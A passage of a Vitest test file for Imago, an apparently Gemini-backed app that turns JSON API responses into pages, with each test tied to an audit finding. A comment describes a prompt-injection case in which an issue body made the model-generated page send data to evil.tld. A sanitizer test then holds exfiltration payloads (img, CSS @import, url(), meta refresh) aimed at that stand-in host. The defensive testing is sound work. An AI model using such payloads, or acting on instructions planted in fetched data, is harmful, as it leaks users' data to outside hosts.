/* The 2026-09-24 audit: one test per problem it found, each named after
   what the reader saw. Grouped the way the fixes are: a request's
   lifetime, layouts remembered by shape, what leaves the browser, what a
   page looks like, and the controls around it. */
import { describe, it, expect, vi } from 'vitest';
import { boot, jsonFetch, flush } from './harness.js';

const settle = async (n = 6) => { for (let i = 0; i < n; i += 1) await flush(); };
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

function geminiReply(spec) {
  return { candidates: [{ content: { parts: [{ text: JSON.stringify(spec) }] } }] };
}

// A fetch whose replies the test releases by hand, per URL.
function heldFetch(seen) {
  const held = {};
  const fn = (url, init) => {
    seen.push({ url: String(url), init });
    return new Promise((resolve) => { held[String(url)] = resolve; });
  };
  fn.release = (url, body) => held[url](jsonFetch(body)());
  return fn;
}

const PIKACHU = { name: 'pikachu', height: 4, types: [{ type: { name: 'electric' } }] };
const DITTO = { name: 'ditto', height: 3, types: [{ type: { name: 'normal' } }] };
const PLAN = { title: 'Pikachu', subtitle: 'Electric', layout: 'profile',
  components: [{ type: 'metric', path: 'height', label: 'Height' }], actions: [] };

/* ── A request's lifetime ─────────────────────────────────────────────── */

describe('a slow request no longer locks the app', () => {
  // Opening an example that hung for 30s ignored every later click, and the
  // URL typed meanwhile was lost when the slow request finally failed.
  it('a new request replaces the one in flight, and the late reply is ignored', async () => {
    const seen = [];
    const fetch = heldFetch(seen);
    const app = await boot({ fetch });
    app.setUrlInput('https://slow.test/a');
    app.performRequest(false);
    app.setUrlInput('https://fast.test/b');
    expect(app.performRequest(false)).toBe(true);
    fetch.release('https://fast.test/b', { b: 1 });
    await settle();
    expect(app.state.dataUrl).toBe('https://fast.test/b');
    expect(app.dom.urlInput.value).toBe('https://fast.test/b');

    fetch.release('https://slow.test/a', { a: 1 });   // the slow one answers after all
    await settle();
    expect(app.state.data).toEqual({ b: 1 });
    expect(app.state.dataUrl).toBe('https://fast.test/b');
    expect(app.state.inFlight).toBe(false);
  });

  it('the request that was replaced is aborted', async () => {
    const seen = [];
    const app = await boot({ fetch: heldFetch(seen) });
    app.setUrlInput('https://slow.test/a');
    app.performRequest(false);
    app.setUrlInput('https://slow.test/b');
    app.performRequest(false);
    expect(seen[0].init.signal.aborted).toBe(true);
    expect(seen[1].init.signal.aborted).toBe(false);
  });

  it('a request that never answers times out instead of spinning forever', async () => {
    const app = await boot({ fetch: () => new Promise(() => {}) });
    app.TIMEOUTS.request = 40;
    app.setUrlInput('https://hang.test/x');
    app.performRequest(false);
    await wait(80);
    await settle();
    expect(app.state.inFlight).toBe(false);
    expect(app.dom.sendBtn.disabled).toBe(false);
    expect(app.dom.interfaceOut.textContent).toContain('Timed out');
    expect(app.dom.interfaceOut.textContent).toContain('hang.test did not answer');
  });

  it('a Watch tick still waits for a request in flight', async () => {
    const seen = [];
    const app = await boot({ fetch: heldFetch(seen) });
    app.setUrlInput('https://slow.test/a');
    app.performRequest(false);
    expect(app.performRequest(true)).toBe(false);
    expect(seen).toHaveLength(1);
  });
});

describe('model calls cannot wedge Generate', () => {
  function keyedApp(fetch) {
    return boot({ fetch, local: { 'imago.key.gemini': 'AIzaTESTKEY' } });
  }

  // A generation still running for another page made Generate return
  // silently, leaving the button disabled with no spinner and no message.
  it('Generate starts a new call even while an older one is running', async () => {
    const calls = [];
    const app = await keyedApp((url) => { calls.push(url); return new Promise(() => {}); });
    app.state.url = app.state.dataUrl = 'https://a.test/x';
    app.state.data = { a: 1 };
    app.state.schemaHash = 'H';
    app.state.generating = true;          // something else is already thinking
    expect(app.generateInterfaceNow()).toBe(true);
    expect(calls).toHaveLength(1);
    expect(app.dom.interfaceOut.textContent).toContain('Designing an interface');
  });

  it('the prompt button comes back when nothing could start', async () => {
    const app = await boot();
    app.state.data = { a: 1 };
    app.state.schemaHash = 'H';
    app.showGeneratePrompt();
    app.state.data = null;                // nothing left to generate from
    const btn = app.dom.interfaceOut.querySelector('#generateBtn');
    btn.click();
    expect(btn.disabled).toBe(false);
  });

  it('a model that never answers times out and says so', async () => {
    const app = await keyedApp(() => new Promise(() => {}));
    app.TIMEOUTS.model = 40;
    app.state.url = app.state.dataUrl = 'https://a.test/x';
    app.state.data = { a: 1 };
    app.state.schemaHash = 'H';
    const done = app.callGemini('https://a.test/x', { hash: 'H', schema: { a: 'number' } });
    await wait(80);
    await done;
    expect(app.state.generating).toBe(false);
    expect(app.dom.interfaceOut.textContent).toContain('did not answer within');
  });

  // Generating for page A, then opening page B of another shape: A's reply
  // replaced B's page with a basic layout titled after A.
  it('a late reply for another page leaves the page on screen alone', async () => {
    let answer;
    const app = await keyedApp(() => new Promise((r) => { answer = r; }));
    app.state.url = app.state.dataUrl = 'https://a.test/x';
    app.state.data = { a: 1 };
    app.state.schemaHash = 'HA';
    const done = app.callGemini('https://a.test/x', { hash: 'HA', schema: { a: 'number' } });

    app.state.url = app.state.dataUrl = 'https://b.test/y';   // the reader moved on
    app.state.data = { b: 2 };
    app.state.schemaHash = 'HB';
    app.applySpec(app.normalizeSpec({ title: 'Page B', layout: 'dashboard',
      components: [{ type: 'metric', path: 'b', label: 'B' }] }), 'cache');

    answer(jsonFetch(geminiReply(PLAN))());
    await done;
    expect(app.state.spec.title).toBe('Page B');
    expect(app.dom.interfaceOut.querySelector('.alert')).toBeNull();
    expect(app.getSchemaSpecs().HA).toBeUndefined();
  });
});

describe('a failed request puts back the page that was on screen', () => {
  // Page A (cached plan), then B (Generate prompt), then a 404: A's layout
  // was drawn over B's data under "Below is Pikachu page".
  it('a failure over a Generate prompt keeps the prompt, not the plan before it', async () => {
    const app = await boot({ fetch: jsonFetch('nope', { ok: false, status: 404 }), local: { 'imago.key.gemini': 'AIzaTESTKEY' } });
    app.state.url = app.state.dataUrl = 'https://a.test/pikachu';
    app.state.data = PIKACHU;
    app.applySpec(app.normalizeSpec(PLAN), 'cache');
    app.state.url = app.state.dataUrl = 'https://b.test/weather';
    app.state.data = { temp: 20 };
    app.state.pendingGenerate = true;
    app.showGeneratePrompt();
    expect(app.state.spec).toBeNull();

    app.setUrlInput('https://c.test/missing');
    app.performRequest(false);
    await settle();
    const text = app.dom.interfaceOut.textContent;
    expect(text).not.toContain('Pikachu');
    expect(app.dom.interfaceOut.querySelector('#generateBtn')).not.toBeNull();
    expect(text).toContain('HTTP 404');
  });

  // One failed Watch tick in HTML mode replaced the generated page with an
  // error screen.
  it('a failed Watch tick keeps a generated page', async () => {
    const app = await boot();
    app.state.builder = 'html';
    app.state.url = app.state.dataUrl = 'https://x.test/api';
    app.state.data = { a: 1 };
    app.applyHtml('<div><h1>Page</h1></div>', 'generated');
    const frame = app.dom.interfaceOut.querySelector('iframe.html-frame');
    app.handleRequestFailure({ title: 'Boom', detail: 'went wrong' }, true);
    app.handleRequestFailure({ title: 'Boom', detail: 'went wrong' }, true);
    // The very same frame: a tick that redrew it would reload the page.
    expect(app.dom.interfaceOut.querySelector('iframe.html-frame')).toBe(frame);
    expect(app.dom.interfaceOut.querySelectorAll('.alert')).toHaveLength(1);
  });

  // "Response began: Below is Openlibrary, the last page that loaded." — an
  // empty body ran straight into the next sentence.
  it('an empty error body is said plainly, and the kept page is its own paragraph', async () => {
    let fail = false;
    const app = await boot({ fetch: (url) => (fail
      ? jsonFetch('', { ok: false, status: 500 })(url)
      : jsonFetch({ name: 'widget', size: 3 })(url)) });
    app.setUrlInput('https://a.test/widget');
    app.performRequest(false);
    await settle();
    fail = true;
    app.setUrlInput('https://b.test/other');
    app.performRequest(false);
    await settle();
    const paragraphs = [...app.dom.interfaceOut.querySelectorAll('.alert .alert-body')].map((p) => p.textContent);
    expect(paragraphs).toEqual([
      'The endpoint rejected the request. Its response was empty.',
      'Below is Widget, the last page that loaded.'
    ]);
  });

  it('a 200 with no body is an empty response, not "not JSON"', async () => {
    const app = await boot({ fetch: jsonFetch('') });
    app.setUrlInput('https://a.test/empty');
    app.performRequest(false);
    await settle();
    expect(app.dom.interfaceOut.textContent).toContain('Empty response');
    expect(app.dom.interfaceOut.textContent).not.toContain('not JSON');
  });
});

describe('Watch', () => {
  // With Watch on, [] becoming [{…}] swapped the page for the Generate
  // prompt, and the timer kept fetching behind it.
  it('a new shape under Watch keeps a live basic layout instead of a prompt', async () => {
    const app = await boot({ local: { 'imago.key.gemini': 'AIzaTESTKEY' } });
    app.state.url = app.state.dataUrl = 'https://a.test/x';
    app.state.data = { alerts: [{ level: 'high' }], temp: 21 };
    const print = app.fingerprint(app.state.data);
    app.resolveSpec('https://a.test/x', print, false, true);
    expect(app.state.pendingGenerate).toBe(false);
    expect(app.dom.interfaceOut.querySelector('#generateBtn')).toBeNull();
    const note = app.dom.interfaceOut.querySelector('.alert.alert-note');
    expect(note.textContent).toContain('changed shape');
    expect(note.querySelector('.alert-action').textContent).toBe('Generate');
  });

  it('a Generate prompt stops the timer that was running', async () => {
    const app = await boot({ fetch: jsonFetch({ fresh: 1 }), local: { 'imago.key.gemini': 'AIzaTESTKEY' } });
    app.state.refreshIntervalMs = 10000;
    app.startTimer();
    expect(app.state.tickHandle).toBeTruthy();
    app.setUrlInput('https://a.test/new-shape');
    app.performRequest(false);
    await settle();
    expect(app.state.pendingGenerate).toBe(true);
    expect(app.state.tickHandle).toBeNull();
  });

  it('Clear all data stops Watch', async () => {
    const app = await boot();
    app.state.refreshIntervalMs = 10000;
    app.state.data = { a: 1 };
    app.startTimer();
    app.clearAllData();
    expect(app.state.tickHandle).toBeNull();
    expect(app.state.refreshIntervalMs).toBe(0);
    expect(app.dom.refreshToggle.getAttribute('aria-checked')).toBe('false');
    expect(app.state.data).toBeNull();
  });
});

describe('the meta row describes the page on screen', () => {
  // While a new endpoint loaded, "Checked 44s ago · 353.8 KB" of the
  // previous page stayed up.
  it('hides while another endpoint loads', async () => {
    const seen = [];
    const app = await boot({ fetch: heldFetch(seen) });
    app.state.url = app.state.dataUrl = 'https://a.test/x';
    app.state.data = { a: 1 };
    app.updateMeta();
    expect(app.dom.runMeta.hidden).toBe(false);
    app.setUrlInput('https://b.test/y');
    app.performRequest(false);
    expect(app.dom.runMeta.hidden).toBe(true);
  });
});

/* ── Layouts remembered by shape ──────────────────────────────────────── */

describe('a remembered layout names the response it is showing', () => {
  // Generate for /pokemon/pikachu, open /pokemon/ditto: the heading said
  // "Pikachu" and the subtitle "Electric".
  it('another endpoint of the same shape gets its own title, and no borrowed subtitle', async () => {
    const hash = (await boot()).fingerprint(DITTO).hash;
    const app = await boot({
      fetch: jsonFetch(DITTO),
      local: { 'imago.schemaSpecs': { [hash]: { spec: PLAN, sourceUrl: 'https://pokeapi.co/api/v2/pokemon/pikachu' } } }
    });
    app.setUrlInput('https://pokeapi.co/api/v2/pokemon/ditto');
    app.performRequest(false);
    await settle();
    expect(app.state.specSource).toBe('cache');
    expect(app.dom.interfaceOut.querySelector('.stage-title').textContent).toBe('Ditto');
    expect(app.dom.interfaceOut.querySelector('.stage-sub')).toBeNull();
  });

  it('the endpoint the layout was made for keeps its title', async () => {
    const app = await boot();
    const out = app.fitTitle(app.normalizeSpec(PLAN), PIKACHU, 'https://p.test/pikachu', 'https://p.test/pikachu');
    expect(out.title).toBe('Pikachu');
    expect(out.subtitle).toBe('Electric');
  });

  it('a plan that names its title field reads it from each response', async () => {
    const app = await boot();
    const spec = app.normalizeSpec({ ...PLAN, titlePath: 'name' });
    expect(spec.titlePath).toBe('name');
    expect(app.fitTitle(spec, DITTO, 'https://p.test/ditto', 'https://p.test/pikachu').title).toBe('Ditto');
    expect(app.fitTitle(spec, { ...PIKACHU, name: 'raichu' }, 'https://p.test/pikachu', 'https://p.test/pikachu').title).toBe('Raichu');
  });

  it('the prompt asks for titlePath, and the schema allows it', async () => {
    const app = await boot();
    const prompt = app.buildImagoPrompt({ url: 'https://p.test/pikachu', schema: {}, sample: '{}' });
    expect(prompt).toContain('titlePath');
    expect(prompt).toContain('true of any');
  });

  it('a reload restores a remembered layout with the right title too', async () => {
    const probe = await boot();
    const url = 'https://pokeapi.co/api/v2/pokemon/ditto';
    const hash = probe.fingerprint(DITTO).hash;
    const app = await boot({ local: {
      'imago.schemaSpecs': { [hash]: { spec: PLAN, sourceUrl: 'https://pokeapi.co/api/v2/pokemon/pikachu' } },
      'imago.snapshots': { [probe.hashString(url)]: [{ id: 's', fetchedAt: '2026-09-24T08:00:00Z', status: 200, data: DITTO }] }
    } });
    expect(app.restoreFromSnapshot(url)).toBe(true);
    expect(app.state.spec.title).toBe('Ditto');
  });
});

describe('a remembered HTML page stays with its endpoint', () => {
  const DOC = '<div><h1>Pikachu</h1></div>';

  // The page has one response's values written in. Cached by shape, it
  // showed user 1's values under user 2, and the stale bar never appeared.
  it('is not shown for another endpoint of the same shape', async () => {
    const hash = (await boot()).fingerprint(DITTO).hash;
    const app = await boot({
      fetch: jsonFetch(DITTO),
      local: { 'imago.key.gemini': 'AIzaTESTKEY',
        'imago.schemaSpecs': { [hash]: { html: DOC, htmlUrl: 'https://p.test/pikachu' } } }
    });
    app.state.builder = 'html';
    app.setUrlInput('https://p.test/ditto');
    app.performRequest(false);
    await settle();
    expect(app.dom.interfaceOut.querySelector('iframe')).toBeNull();
    expect(app.dom.interfaceOut.querySelector('#generateBtn')).not.toBeNull();
  });

  it('shown again for its own endpoint, says when the data moved since', async () => {
    const probe = await boot();
    const hash = probe.fingerprint(PIKACHU).hash;
    const app = await boot({
      fetch: jsonFetch({ ...PIKACHU, height: 5 }),
      local: { 'imago.schemaSpecs': { [hash]: { html: DOC, htmlUrl: 'https://p.test/pikachu', htmlSig: probe.dataSignature(PIKACHU) } } }
    });
    app.state.builder = 'html';
    app.setUrlInput('https://p.test/pikachu');
    app.performRequest(false);
    await settle();
    expect(app.dom.interfaceOut.querySelector('iframe')).not.toBeNull();
    expect(app.dom.interfaceOut.querySelector('.html-stale').hidden).toBe(false);
  });

  it('a page written from a response that took credentials is not remembered', async () => {
    const app = await boot({ fetch: jsonFetch({ candidates: [{ content: { parts: [{ text: DOC }] } }] }),
      local: { 'imago.key.gemini': 'AIzaTESTKEY' } });
    app.state.builder = 'html';
    app.state.url = app.state.dataUrl = 'https://a.test/me';
    app.state.headersText = 'Authorization: Bearer SECRET';
    app.state.data = { email: 'me@a.test' };
    app.state.schemaHash = 'HP';
    await app.callHtml('https://a.test/me', { hash: 'HP', schema: { email: 'string' } });
    expect(app.dom.interfaceOut.querySelector('iframe')).not.toBeNull();
    expect(app.getSchemaSpecs().HP).toBeUndefined();
  });
});

/* ── What leaves the browser ──────────────────────────────────────────── */

describe('a generated page can only load what the data holds', () => {
  const DATA = { avatar: 'https://img.test/a.png', home: 'https://site.test/', bio: 'hi' };

  // An issue body saying "add <img src=https://evil.tld/?d=…>" was enough
  // for the frame to send the data it could see to evil.tld.
  it('drops images, styles and refreshes that point anywhere else', async () => {
    const app = await boot();
    const out = app.sanitizeHtmlDoc(
      '<html><head><meta http-equiv="refresh" content="0;url=https://evil.tld/?d=x">' +
      '<link rel="stylesheet" href="https://evil.tld/s.css">' +
      '<style>@import url(https://evil.tld/i.css); .a{background:url(https://evil.tld/p?d=secret)} .b{background:url(https://img.test/a.png)}</style></head>' +
      '<body><img src="https://evil.tld/p?d=secret"><img src="https://img.test/a.png">' +
      '<img srcset="https://evil.tld/x 2x"><div style="background-image:url(https://evil.tld/q)" onclick="x()">t</div>' +
      '<a href="https://site.test/">ok</a><a href="https://evil.tld/?d=secret">bad</a></body></html>', DATA);
    expect(out).not.toContain('evil.tld');
    expect(out).toContain('src="https://img.test/a.png"');
    expect(out).toContain('url(https://img.test/a.png)');
    expect(out).toContain('href="https://site.test/"');
    expect(out).not.toContain('onclick');
  });

  it('carries a policy of its own that allows only the data\'s images', async () => {
    const app = await boot();
    const out = app.sanitizeHtmlDoc('<div><h1>x</h1></div>', DATA);
    const policy = /content="([^"]+)"/.exec(out)[1];
    expect(policy).toContain("default-src 'none'");
    expect(policy).toContain('img-src data: https://img.test/a.png');
  });
});

describe('keys in the address stay home', () => {
  // A share link to an OpenWeather page carried the sender's appid, though
  // the README promised links never carry keys.
  it('a share link leaves out credential parameters and says so', async () => {
    const app = await boot();
    app.state.url = app.state.dataUrl = 'https://api.test/weather?q=Chennai&appid=SECRET1&api_key=SECRET2';
    app.state.data = { temp: 30 };
    app.applySpec(null, 'fallback');
    const built = app.buildShareLink();
    const payload = app.readShareLink(built.link.slice(built.link.indexOf('#')));
    expect(payload.url).toBe('https://api.test/weather?q=Chennai');
    expect(built.removed).toEqual(['appid', 'api_key']);
  });

  it('the model is told the parameter exists, never its value', async () => {
    const app = await boot();
    const prompt = app.buildHtmlPrompt({ url: 'https://api.test/x?key=AIzaSECRET&q=1', schema: {}, sample: '{}' });
    expect(prompt).not.toContain('AIzaSECRET');
    expect(prompt).toContain('key=REDACTED');
    expect(prompt).toContain('q=1');
  });

  it('ordinary parameters are untouched', async () => {
    const app = await boot();
    expect(app.stripUrlSecrets('https://a.test/x?q=dune&page=2')).toEqual({ url: 'https://a.test/x?q=dune&page=2', removed: [] });
    expect(app.maskUrlSecrets('not a url')).toBe('not a url');
  });
});

describe('what credentials unlock stays in the session', () => {
  // Headers were session-only, but the body they fetched sat in
  // localStorage for good and came back after a restart.
  it('a response fetched with a secret header is not stored', async () => {
    const app = await boot({ fetch: jsonFetch({ email: 'me@a.test' }) });
    app.setUrlInput('https://a.test/me');
    app.dom.headersInput.value = 'Authorization: Bearer SECRET';
    app.performRequest(false);
    await settle();
    expect(app.state.data).toEqual({ email: 'me@a.test' });
    const list = app.getSnapshotsFor(app.hashString('https://a.test/me'));
    expect(list).toHaveLength(1);
    expect(list[0].data).toBeNull();
    expect(JSON.stringify(app.getSnapshots())).not.toContain('me@a.test');
  });

  it('only the most recently fetched endpoints keep a history', async () => {
    const app = await boot();
    for (let i = 0; i < 35; i += 1) {
      app.pushSnapshot('k' + i, { id: 's' + i, fetchedAt: new Date(Date.UTC(2026, 8, 1, 0, i)).toISOString(), data: { i } });
    }
    const keys = Object.keys(app.getSnapshots());
    expect(keys).toHaveLength(30);
    expect(keys).not.toContain('k0');
    expect(keys).toContain('k34');
  });
});

describe('share links only open public https endpoints', () => {
  function encode(app, payload) {
    return '#share=' + app.window.btoa(JSON.stringify(payload)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  }

  // A link could send the visitor's browser to their own machine's services,
  // and Watch kept re-requesting them.
  it('refuses localhost, LAN addresses and plain http', async () => {
    const app = await boot();
    for (const u of ['http://127.0.0.1:11434/api/tags', 'https://localhost/x', 'https://192.168.1.1/status',
                     'https://10.0.0.5/', 'https://[::1]/', 'http://example.com/x', 'https://printer.local/']) {
      expect(app.readShareLink(encode(app, { v: 1, u })).error, u).toMatch(/not a public https endpoint/);
    }
    expect(app.readShareLink(encode(app, { v: 1, u: 'https://api.test/x' })).url).toBe('https://api.test/x');
  });

  it('opening one does not start watching it', async () => {
    const probe = await boot();
    const app = await boot({
      url: 'https://imago.test/' + encode(probe, { v: 1, u: 'https://api.test/x' }),
      local: { 'imago.preferences': { refreshIntervalMs: 10000 } },
      fetch: jsonFetch({ a: 1 })
    });
    await settle();
    expect(app.state.refreshIntervalMs).toBe(0);
    expect(app.state.tickHandle).toBeNull();
  });

  it('private hosts are told apart from public ones', async () => {
    const app = await boot();
    expect(app.isPrivateHost('172.20.1.1')).toBe(true);
    expect(app.isPrivateHost('172.32.1.1')).toBe(false);
    expect(app.isPrivateHost('api.github.com')).toBe(false);
  });
});

describe('Imago refuses to run inside another site', () => {
  it('knows when it is framed', async () => {
    const app = await boot();
    expect(app.isFramed(app.window)).toBe(false);
    const top = {};
    expect(app.isFramed({ self: {}, top })).toBe(true);
    expect(app.isFramed({ get self() { throw new Error('cross-origin'); } })).toBe(true);
  });

  it('shows a way out instead of the app', async () => {
    const app = await boot();
    app.showFramedNotice();
    const body = app.window.document.body;
    expect(body.querySelector('#appView')).toBeNull();
    const link = body.querySelector('.framed-link');
    expect(link.target).toBe('_blank');
    expect(link.rel).toBe('noopener');
  });
});

describe('damaged storage does not stop the app', () => {
  // One null entry in saved requests threw inside the rail during boot, so
  // init() never reached the share link or the view.
  it('boots past a null saved request and still opens a share link', async () => {
    const probe = await boot();
    const hash = '#share=' + probe.window.btoa(JSON.stringify({ v: 1, u: 'https://api.test/x' })).replace(/=+$/, '');
    const app = await boot({
      url: 'https://imago.test/' + hash,
      local: { 'imago.savedRequests': [null, { id: 'a', name: 'A', url: 'https://a.test/x' }, { name: 'no id' }] },
      fetch: jsonFetch({ a: 1 })
    });
    await settle();
    expect(app.getSavedRequests()).toHaveLength(1);
    expect(app.state.dataUrl).toBe('https://api.test/x');
  });

  it('a bad snapshot entry does not break the history strip', async () => {
    const app = await boot();
    app.state.url = 'https://a.test/x';
    app.state.data = { a: 1 };
    app.setSnapshots({ [app.currentRequestKey()]: [null, { id: 's1', changed: 0 }, 'junk', { id: 's2', changed: 1 }] });
    expect(() => app.renderHistory()).not.toThrow();
    expect(app.getSnapshotsFor(app.currentRequestKey())).toHaveLength(2);
  });
});

describe('a rejected key stops reading as ready', () => {
  // Test said Gemini rejected the key; Settings still said "Saved", the top
  // bar "Google Gemini ready", and endpoints showed only "Ready to generate".
  it('Test marks the key rejected everywhere, and a new key clears it', async () => {
    const app = await boot({
      fetch: jsonFetch({ error: { message: 'API key not valid. Please pass a valid API key.' } }, { ok: false, status: 400 })
    });
    app.dom.geminiKey.value = 'AIzaBOGUS';
    app.dom.geminiKey.dispatchEvent(new app.window.Event('input', { bubbles: true }));
    await app.testProvider('gemini');
    expect(app.dom.geminiKeyStatus.textContent).toMatch(/^Rejected/);
    expect(app.dom.geminiKeyStatus.getAttribute('data-state')).toBe('missing');
    expect(app.dom.keyStatus.getAttribute('data-state')).toBe('missing');

    app.state.url = app.state.dataUrl = 'https://a.test/x';
    app.state.data = { a: 1 };
    app.resolveSpec('https://a.test/x', app.fingerprint({ a: 1 }), false);
    expect(app.dom.interfaceOut.querySelector('#generateBtn')).toBeNull();
    expect(app.dom.interfaceOut.querySelector('.keyline').textContent).toContain('rejected your key');

    app.dom.geminiKey.value = 'AIzaFRESH';
    app.dom.geminiKey.dispatchEvent(new app.window.Event('input', { bubbles: true }));
    expect(app.dom.geminiKeyStatus.textContent).toMatch(/^Saved/);
    expect(app.dom.keyStatus.getAttribute('data-state')).toBe('ready');
  });

  it('a generation the provider refuses marks the key too', async () => {
    const app = await boot({
      fetch: jsonFetch({ error: { message: 'Invalid API Key' } }, { ok: false, status: 401 }),
      local: { 'imago.key.gemini': 'AIzaBOGUS' }
    });
    app.state.url = app.state.dataUrl = 'https://a.test/x';
    app.state.data = { a: 1 };
    app.state.schemaHash = 'H';
    await app.callGemini('https://a.test/x', { hash: 'H', schema: { a: 'number' } });
    expect(app.dom.keyStatus.getAttribute('data-state')).toBe('missing');
  });
});

describe('a generation error keeps its explanation', () => {
  it('uses the detail of Imago\'s own errors', async () => {
    const app = await boot();
    const info = app.providerErrorText(app.getProvider('gemini'), { title: 'Response changed', detail: 'Press Generate again.', message: 'Response changed' });
    expect(info).toEqual({ title: 'Response changed', message: 'Press Generate again.', badKey: false });
  });
});

/* ── What a page looks like ───────────────────────────────────────────── */

describe('timestamps of any precision', () => {
  // {"timestamp": 1695550000000000000} showed only the title and a
  // "Request failed" toast: toISOString threw a RangeError.
  it('nanoseconds and microseconds render as the moment they name', async () => {
    const app = await boot();
    const ns = app.renderComponent({ type: 'metric', path: 'timestamp', label: 'When' }, { timestamp: 1695550000000000000 }, null);
    const us = app.renderComponent({ type: 'metric', path: 'timestamp', label: 'When' }, { timestamp: 1695550000000000 }, null);
    expect(ns.node.textContent).toContain('10:06');
    expect(us.node.textContent).toContain('10:06');
    expect(ns.node.textContent).toContain('2023');
  });

  it('a number too big for any date shows as a number', async () => {
    const app = await boot();
    const out = app.renderComponent({ type: 'metric', path: 'updated_at', label: 'x' }, { updated_at: 1e300 }, null);
    expect(out.node.textContent).not.toContain('Invalid');
  });
});

describe('a chart reports its own numbers', () => {
  // "48 points · low 7.2 · high 28.2" for 168 points whose low was 8.9 and
  // high 26.3: the caption read the padded range of a thinned series.
  it('the caption gives the real count, low and high', async () => {
    const app = await boot();
    const series = Array.from({ length: 168 }, (_, i) => 15 + Math.sin(i / 5) * 3);
    series[77] = 26.3;       // a lone peak between two even samples
    series[130] = 8.9;
    const out = app.renderComponent({ type: 'chart', path: 't', label: 'Temp' }, { t: series }, null);
    expect(out.node.querySelector('.more-note').textContent).toBe('168 points · low 8.9 · high 26.3');
    const ticks = [...out.node.querySelectorAll('.chart-tick')].map((t) => t.textContent);
    expect(ticks[0]).toBe('26.3');
    expect(ticks[ticks.length - 1]).toBe('8.9');
  });
});

describe('the list a response is for is the page', () => {
  const SEARCH = {
    numFound: 48232, start: 0, numFoundExact: true, num_found: 48232, q: 'dune',
    docs: Array.from({ length: 100 }, (_, i) => ({ title: 'Book ' + i, author_name: ['A' + i], first_publish_year: 1965 + i }))
  };

  // A search for "dune" led with "Number found" (twice) and "Start 0"; the
  // hundred books were folded into Details, half width, ten rows.
  it('a search\'s results lead the page as a full-width table', async () => {
    const app = await boot();
    const spec = app.normalizeSpec(app.buildFallbackSpec(SEARCH, 'https://openlibrary.org/search.json?q=dune'));
    expect(spec.layout).toBe('table');
    const docs = spec.components.find((c) => c.path === 'docs');
    expect(docs.type).toBe('table');
    expect(docs.emphasis).not.toBe('quiet');
    expect(spec.components.filter((c) => /^num_?found$/i.test(c.path))).toHaveLength(1);
    expect(spec.components.find((c) => c.path === 'start').emphasis).toBe('quiet');

    app.state.data = SEARCH;
    app.state.url = 'https://openlibrary.org/search.json?q=dune';
    app.applySpec(spec, 'fallback');
    const details = app.dom.interfaceOut.querySelector('details.spec-details');
    expect(details && details.querySelector('table')).toBeFalsy();
    expect(app.dom.interfaceOut.querySelector('.span-12 table')).not.toBeNull();
  });

  it('a long table can show all its rows', async () => {
    const app = await boot();
    const out = app.renderComponent({ type: 'table', path: 'docs', label: 'Docs' }, SEARCH, null);
    expect(out.node.querySelectorAll('tbody tr')).toHaveLength(10);
    const more = out.node.querySelector('.table-more');
    expect(more.textContent).toBe('Show all 100');
    more.click();
    expect(out.node.querySelectorAll('tbody tr')).toHaveLength(100);
    expect(out.node.querySelector('.table-foot .more-note').textContent).toBe('All 100 rows');
    expect(out.node.querySelector('.table-more')).toBeNull();
  });

  it('a record with several structures keeps its old layout', async () => {
    const app = await boot();
    const spec = app.buildFallbackSpec({ name: 'x', height: 4, moves: [{ a: 1 }], stats: [{ b: 2 }] }, 'https://a.test/x');
    expect(spec.layout).not.toBe('table');
  });
});

describe('a list inside a table row is summarised, not dropped', () => {
  // Past stats showed only the Generation column; the stats themselves
  // were gone.
  it('names each record and its number', async () => {
    const app = await boot();
    const rows = [{ generation: { name: 'gen-v' }, stats: [
      { base_stat: 35, effort: 0, stat: { name: 'hp' } },
      { base_stat: 55, effort: 0, stat: { name: 'attack' } },
      { base_stat: 40, effort: 0, stat: { name: 'defense' } },
      { base_stat: 90, effort: 2, stat: { name: 'speed' } }
    ] }];
    const out = app.renderComponent({ type: 'table', path: 'past', label: 'Past' }, { past: rows }, null);
    const headers = [...out.node.querySelectorAll('th')].map((t) => t.textContent);
    expect(headers).toEqual(['Generation', 'Stats']);
    expect(out.node.querySelector('tbody td:last-child').textContent).toBe('hp 35, attack 55, defense 40 +1');
  });
});

describe('arrays that open with a null', () => {
  it('[null, {…}] is a list of objects, not of nulls', async () => {
    const app = await boot();
    expect(app.deriveSchema([null, { a: 1 }])).toEqual({ type: 'array', items: { a: 'number' } });
    expect(app.deriveSchema([{ a: 1 }, null])).toEqual({ type: 'array', items: { a: 'number' } });
  });
});

/* ── The controls around a page ───────────────────────────────────────── */

describe('an address without https://', () => {
  // "pokeapi.co/api/v2/pokemon/ditto" was "not a valid URL".
  it('gets a scheme added, and goes', async () => {
    const seen = [];
    const app = await boot({ fetch: (url) => { seen.push(url); return jsonFetch({ a: 1 })(); } });
    app.setUrlInput('pokeapi.co/api/v2/pokemon/ditto');
    expect(app.performRequest(false)).toBe(true);
    await settle();
    expect(seen).toEqual(['https://pokeapi.co/api/v2/pokemon/ditto']);
    expect(app.dom.urlInput.value).toBe('https://pokeapi.co/api/v2/pokemon/ditto');
  });

  it('only when it reads as a host', async () => {
    const app = await boot();
    expect(app.withScheme('localhost:3000/x')).toBe('http://localhost:3000/x');
    expect(app.withScheme('api.test.io?q=1')).toBe('https://api.test.io?q=1');
    expect(app.withScheme('ftp://a.test')).toBe('ftp://a.test');
    expect(app.withScheme('not a url')).toBe('not a url');
    expect(app.withScheme('hello')).toBe('hello');
  });
});

describe('saved endpoints', () => {
  const SAVED = [
    { id: 'a', name: 'A', url: 'https://a.test/x', createdAt: '2026-09-20T09:00:00Z' },
    { id: 'b', name: 'B', url: 'https://b.test/x', createdAt: '2026-09-20T08:00:00Z' }
  ];

  // After Delete, focus fell to <body>, and the Undo toast was gone before
  // a keyboard user could reach it.
  it('deleting one moves focus to the next row', async () => {
    const app = await boot({ local: { 'imago.savedRequests': SAVED } });
    app.renderSavedList();
    const del = app.dom.savedList.querySelector('[data-focus-key="delete:a"]');
    del.focus();
    del.click();
    expect(app.window.document.activeElement.getAttribute('data-focus-key')).toBe('delete:b');
  });

  it('deleting the last one moves focus to New request', async () => {
    const app = await boot({ local: { 'imago.savedRequests': [SAVED[0]] } });
    app.renderSavedList();
    app.dom.savedList.querySelector('.saved-delete').click();
    expect(app.window.document.activeElement).toBe(app.dom.newRequestBtn);
  });

  // The button still read "Save" with an empty star after saving, and the
  // name was stored lowercase ("pikachu") under a page titled "Pikachu".
  it('Save shows that the address is saved, under the page\'s own title', async () => {
    const app = await boot();
